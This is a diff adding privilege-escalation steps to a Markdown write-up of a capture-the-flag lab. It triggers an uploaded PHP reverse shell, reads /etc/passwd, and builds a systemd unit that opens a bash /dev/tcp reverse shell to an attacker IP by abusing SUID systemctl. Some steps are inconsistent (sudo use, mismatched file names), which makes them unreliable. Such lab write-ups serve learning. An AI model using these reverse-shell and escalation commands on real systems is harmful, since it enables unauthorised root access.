@@ -126,7 +126,101 @@ nc -lvnp 1337
 ### Execute the payload
 Browse
 ```
-
+http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml
 ```
 
-### gain access
+### Gaining Access
+![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/gain-acc.png)
+
+`cat /etc/passwd`
+![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/passwd.png)
+
+### Upgrading the shell
+
+![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/import_pty.png)
+
+## Previledge Escalation
+
+### Looking for Files with SUID Permission
+`find / -type f -user root -perm -4000 2>/dev/null`
+```
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+The above command can be modified for long listing the files
+`find / -type f -user root -perm -4000 -exec ls -lash {} \; 2>/dev/null`
+or
+`find / -type f -user root -perm -4000 2>/dev/null | xargs -I{} ls -lash {}`
+for faster output
+
+`/bin/systemctl` should not be allowed to run as the owner `root`. We can take advantage of the permission to gain `root` access.
+
+
+
+Let us create the file named `root.service` under `/tmp` directory
+```
+[Unit]
+Description=root
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'exec 5<>/dev/tcp/10.12.34.56/1337; bash >&5 2>&5 0<&5'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Since we are creating `systemd` unit files under the directory that is not one of the standard directories of `systemd`, we have to create a symbolic link under /etc/systemd/system/ directory to make our unit file(`root.service`) available for management by systemctl by either running
+```
+sudo systemctl link /tmp/root.service
+```
+or by manually running
+```
+sudo ln -s /tmp/rooting.service /etc/systemd/system/root.service
+```
+Then we reload our configuration files for systemd to recognize our changes.
+```
+sudo systemctl daemon-reload
+```
+We then `enable` and `start` our service.
+```
+sudo systemctl enable root.service
+sudo systemctl start root.service
+```
+
+![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/mount-error.png)
+
+Now, we have encountered `Failed to start tmp-root.service.mount: Unit tmp-root.service.mount not found` and cannot start our `root.service` resulting in not running our script.
+
+This problem is because when we create a systemd unit file in the `/tmp` directory, systemd treats this file as a transient or temporary unit. Unit files in `/tmp` are typically considered temporary and are subject to specific behaviors and restrictions by systemd.
+
+Even if your unit.service file does not directly declare dependencies on mount units, the service itself might indirectly rely on filesystems or resources that are typically managed by mount units. In this case our service interacts with the file `/bin/bash` that reside on specific filesystems. Systemd can automatically infer dependencies on mount units that manage these filesystems to ensure they are mounted before the service starts.
+
+When we create a systemd service unit (let's say `unit.service`) that interacts with specific files or directories, systemd may implicitly infer dependencies on mount units (`.mount` files) that manage the filesystems where these files/directories reside.
+Systemd attempts to ensure that all necessary resources (including filesystems) are available before starting services. If our service requires access to files on certain filesystems, systemd will try to resolve dependencies by referencing the corresponding mount units.
+
+
+
